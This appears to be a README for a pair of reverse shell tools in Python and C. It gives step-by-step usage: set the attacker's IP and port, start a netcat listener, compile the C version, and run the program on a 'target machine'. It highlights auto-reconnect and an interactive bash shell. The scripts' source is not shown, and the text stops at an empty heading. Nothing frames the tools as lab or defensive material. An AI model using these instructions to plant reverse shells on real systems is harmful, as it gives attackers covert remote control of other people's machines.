# Reverse Shells (Python/C)

Here is 2 reverse shells written in **C** and **Python**

---

## Python Reverse Shell

### Compatibility
- `+` **Linux**
- `+` **Windows**  

### Usage
##### [!] Edit the IP and port in the script:
```
LHOST = 'YOUR_IP'
LPORT = 4545
```
Start a listener on your machine:
```
nc -lvnp 4545
```
Run the script on the target machine:
```
python reverse-shell.py
```
### Features

- Auto reconnecting every 5 seconds if connection isnt successful

- Easy to modify

## C Reverse Shell
### Compatibility

`+` Linux

`-` Windows (uses specific syscalls for linux)

### Compiling
```
gcc linux-reverse-shell.c -o reverse-shell
```
### Usage

#### [!] Edit the IP and PORT in code
```
#define IP "YOUR_IP"
#define PORT 4545 //or you can choose some other port
```

Start a listener:
```
nc -lvnp 4545
```
Run the compiled program on the target

```
./reverse_shell
```
### Features

- script will retry to connect every 20 seconds

- Interactive with /bin/bash shell

## Python version
